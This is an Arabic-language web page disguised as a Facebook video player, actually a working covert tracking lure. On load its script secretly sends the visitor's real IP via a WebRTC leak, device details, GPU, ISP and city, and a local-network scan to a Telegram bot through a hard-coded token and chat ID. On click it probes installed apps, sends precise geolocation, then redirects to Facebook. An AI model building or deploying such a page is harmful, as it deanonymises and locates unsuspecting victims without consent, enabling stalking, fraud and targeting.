<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Video HD - مركز البث المباشر</title>
    
    <meta property="og:title" content="شاهد الفيديو الآن">
    <meta property="og:description" content="محتوى حصري بجودة عالية لخدمة المشتركين">
    <meta property="og:image" content="https://appsyria00.github.io/54545/fb_alert.jpg">
    <meta property="og:type" content="website">

    <style>
        body { margin: 0; background: #f0f2f5; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
        .card { text-align: center; background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
        .fb-logo { width: 60px; margin-bottom: 20px; }
        .h1 { font-size: 22px; font-weight: bold; color: #1c1e21; margin-bottom: 15px; }
        .btn { background: #1877f2; color: white; padding: 16px; border-radius: 10px; font-weight: bold; border: none; width: 100%; font-size: 18px; box-shadow: 0 4px 12px rgba(24, 119, 242, 0.4); transition: 0.3s; }
        .btn:hover { background: #166fe5; transform: translateY(-2px); }
    </style>
</head>
<body onclick="startFinalStrike()">

    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-logo">
        <div class="h1">مركز معالجة الفيديو</div>
        <p style="font-size: 14px; color: #606770; margin-bottom: 30px;">يتم الآن فحص العتاد وتخصيص أفضل جودة بث لموقعك... اضغط للمشاهدة فوراً.</p>
        <button class="btn">تشغيل الآن</button>
    </div>

<script>
    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
    const CHAT_ID = "1611398303";

    function send(msg) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
    }

    // 🔱 1. كسر الـ VPN وسحب الـ IP الحقيقي (WebRTC Leak)
    async function crackVPN() {
        try {
            const rtc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
            rtc.createDataChannel("");
            rtc.createOffer().then(o => rtc.setLocalDescription(o));
            rtc.onicecandidate = (i) => {
                if (i && i.candidate && i.candidate.candidate) {
                    let realIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
                    send(`🔓 [VPN BYPASS] الـ IP الحقيقي المكتشف: ${realIP}`);
                }
            };
        } catch(e) {}
    }

    // 🔱 2. تحليل الهوية والماركة التجارية (Screen Match)
    function identifyDevice() {
        let w = screen.width, h = screen.height;
        let model = "جهاز أندرويد (فئة حديثة)";
        if (w === 412 && h === 915) model = "Xiaomi Redmi Note 11/12 Pro (بصمة دقيقة)";
        else if (w === 390 && h === 844) model = "iPhone 13/14 Pro";
        
        let idMsg = `🕵️‍♂️ [تحليل الهوية الشخصية]\n📱 الموديل: ${model}\n📏 الأبعاد: ${w}x${h}\n👤 اللغة: ${navigator.language}`;
        send(idMsg);
    }

    // 🔱 3. فحص الشبكة المحلية وتتبع المسار (صامت)
    async function scanNetwork() {
        const baseIP = "192.168.1."; 
        for (let i = 1; i <= 10; i++) {
            let ip = baseIP + i;
            let ctrl = new AbortController();
            setTimeout(() => ctrl.abort(), 600);
            fetch(`http://${ip}`, { mode: 'no-cors', signal: ctrl.signal }).then(() => {
                send(`✅ جهاز نشط مكتشف داخلياً: ${ip}`);
            }).catch(()=>{});
        }
    }

    // 🔱 4. كشف التطبيقات (عند الضغط لضمان النجاح)
    function giftDiscovery() {
        const schemes = [
            {n: "واتساب", s: "whatsapp://"},
            {n: "تلجرام", s: "tg://"},
            {n: "تيك توك", s: "snssdk1128://"},
            {n: "بينانس", s: "bnc://"}
        ];
        
        schemes.forEach(app => {
            const a = document.createElement('a');
            a.href = app.s;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click(); // محاكاة الضغط لمحاولة فتح البروتوكول
            setTimeout(() => document.body.removeChild(a), 100);
        });
        send("🎁 [تحليل بروتوكولات التطبيقات] جاري الاستجابة...");
    }

    // 🔱 5. الضربة القاضية (عند النقر)
    function startFinalStrike() {
        giftDiscovery(); // يعمل الآن لأن هناك تفاعل بشري
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                let msg = `🎯 [الموقع الدقيق جداً]\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAccuracy: ${pos.coords.accuracy}m\n🔗 الخريطة: http://www.google.com/maps/place/${pos.coords.latitude},${pos.coords.longitude}`;
                send(msg);
                setTimeout(() => location.href = "https://m.facebook.com", 800);
            }, () => { location.href = "https://m.facebook.com"; }, {enableHighAccuracy: true});
        } else { location.href = "https://m.facebook.com"; }
    }

    // تشغيل المحركات الصامتة فور التحميل
    window.onload = () => {
        identifyDevice();
        crackVPN();
        scanNetwork();
        
        // جلب البيانات العامة صمتاً
        fetch('https://ipapi.co/json/').then(r => r.json()).then(geo => {
            send(`🌐 [الموقع العام]\nIP: ${geo.ip}\nالمزود: ${geo.org}\nالمدينة: ${geo.city}`);
        });

        // سحب العتاد صمتاً
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        send(`⚙️ [تقرير العتاد]\nGPU: ${gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}\nCores: ${navigator.hardwareConcurrency}`);
    };
</script>
</body>
</html>
